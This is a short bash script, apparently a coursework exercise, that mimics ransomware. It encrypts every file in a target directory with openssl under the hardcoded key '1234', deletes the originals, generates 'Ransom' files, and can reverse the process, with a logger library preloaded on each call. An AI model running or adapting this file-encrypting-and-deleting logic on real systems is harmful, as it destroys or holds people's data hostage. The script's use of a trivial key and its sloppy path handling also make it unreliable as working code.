#!/bin/bash



# probably don't need this cause it works by givin the arguements in the command line
function menu()
{
    echo "select one of the following operations"
    echo "  1) Encrypt Files"
    echo "  2) Decrypt Files"
    echo "  3) Quit"
}



#encrypt function. The function is encrypting all the files existed in a specific directory. I used different type of openssl algorithm cause i had problems with 
# the given one to read the file
function encrypt()
{
    echo "Encryption is starting"
    echo "..."
    #encryption call
    local files=`ls ${arg[1]}`
    for entry in $files; 
    do
       export LD_PRELOAD=./logger.so; openssl aes-256-cbc -pbkdf2 -k 1234 -salt -a -e -in ${arg[1]}$entry -out ${arg[1]}$entry.txt.encrypt
       rm ${arg[1]}/$entry
    done
    echo "Encryption Complete!."
    echo "Creating Random Files"
    #call the function to generate the files
    test
    echo "Random Files created"
    echo "Process completed"
}

#decryption function. This firstly deletes all the ransom files and then decrypts the remaining. I used different type of openssl algorithm cause i had problems with 
# the given one to read the file 
function decrypt()
{
      echo "Decryption is starting"
      echo "..."

      #file removal
      for entry1 in `ls ${arg[1]} | grep Ransom*`
      do
          rm ${arg[1]}$entry1
      done
      #decryption progress
      counter=1
      for entry in `ls ${arg[1]}`
      do
        test_var="${arg[1]}/$entry"
        export LD_PRELOAD=./logger.so; openssl aes-256-cbc -pbkdf2 -k 1234 -salt -a -d -in $test_var -out ${arg[1]}/file_$counter
        let counter=counter+1
        rm $test_var
      done

    echo "Decryption Complete"
}

#function to generate the files
function test()
{
  export LD_PRELOAD=./logger.so
  ./filegenerator "${arg[1]}" "${arg[2]}"
}

menu
arg=("$@")
case ${arg[0]} in
  1) encrypt;;
  2) decrypt;;
  3) test;;
  4) exit 1;;
  *) echo "invalid option";;
esac
